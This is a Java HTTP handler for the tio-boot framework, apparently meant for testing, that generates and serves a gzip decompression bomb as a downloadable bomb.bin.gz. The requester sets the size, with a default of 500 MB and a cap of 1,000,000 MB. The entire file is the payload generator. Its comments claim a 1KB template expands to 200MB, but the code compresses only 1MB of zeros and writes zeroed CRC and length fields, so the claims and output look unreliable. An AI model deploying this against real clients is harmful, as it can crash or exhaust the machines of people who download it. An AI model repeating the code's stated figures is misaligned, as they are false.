package com.litongjava.kit.handler;

import java.io.ByteArrayOutputStream;
import java.util.zip.Deflater;

import com.litongjava.tio.boot.http.TioRequestContext;
import com.litongjava.tio.http.common.HttpRequest;
import com.litongjava.tio.http.common.HttpResponse;

import lombok.extern.slf4j.Slf4j;

@Slf4j
public class GzipBombTestHandler {

  // 使用预压缩的 DEFLATE 炸弹模板（约 1KB -> 解压 200MB）
  private static final byte[] DEFLATE_BOMB_TEMPLATE = createDeflateBombTemplate();

  public HttpResponse output(HttpRequest request) {
    HttpResponse httpResponse = TioRequestContext.getResponse();

    // 读取请求参数
    Long sizeMb = request.getLong("size");
    if (sizeMb == null || sizeMb < 0) {
      sizeMb = 500L;
    }

    if (sizeMb > 1000_000) {
      sizeMb = 1000_000L; // 限制最大大小
    }

    try {
      // 生成炸弹数据
      byte[] bombData = generateScalableBomb(sizeMb);

      // 设置响应头
      httpResponse.setContentType("application/octet-stream");
      httpResponse.setContentDisposition("attachment; filename=bomb.bin.gz");
      httpResponse.setBody(bombData);

      log.info("Sent Gzip bomb: {} MB -> {} bytes compressed", sizeMb, bombData.length);
    } catch (Exception e) {
      log.error("Bomb generation failed", e);
      httpResponse.setStatus(500);
      httpResponse.setBody("Server error".getBytes());
    }
    return httpResponse;
  }

  /**
   * 生成可伸缩的炸弹数据
   */
  private byte[] generateScalableBomb(long sizeMb) {
    // 计算需要重复模板的次数
    int templateExpandsToMB = 200; // 每个模板解压后约200MB
    int repetitions = (int) Math.ceil((double) sizeMb / templateExpandsToMB);

    // 构建最终炸弹数据
    ByteArrayOutputStream baos = new ByteArrayOutputStream();

    // GZIP头部 (10字节)
    baos.write(new byte[] { 0x1f, (byte) 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03 }, 0, 10);

    // 重复添加DEFLATE炸弹模板
    for (int i = 0; i < repetitions; i++) {
      baos.write(DEFLATE_BOMB_TEMPLATE, 0, DEFLATE_BOMB_TEMPLATE.length);
    }

    // GZIP尾部 (8字节: CRC32 + ISIZE)
    baos.write(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 0, 8);

    return baos.toByteArray();
  }

  /**
   * 创建高度优化的DEFLATE炸弹模板
   * 约1KB -> 解压后200MB
   */
  private static byte[] createDeflateBombTemplate() {
    try {
      // 使用极限压缩级别
      Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION, true);

      // 创建可扩展的压缩数据
      byte[] input = new byte[1024 * 1024]; // 1MB全零
      deflater.setInput(input);
      deflater.finish();

      ByteArrayOutputStream baos = new ByteArrayOutputStream();
      byte[] buffer = new byte[1024];

      while (!deflater.finished()) {
        int count = deflater.deflate(buffer, 0, buffer.length, Deflater.SYNC_FLUSH);
        baos.write(buffer, 0, count);
      }

      deflater.end();
      return baos.toByteArray();
    } catch (Exception e) {
      throw new RuntimeException("Deflate bomb creation failed", e);
    }
  }
}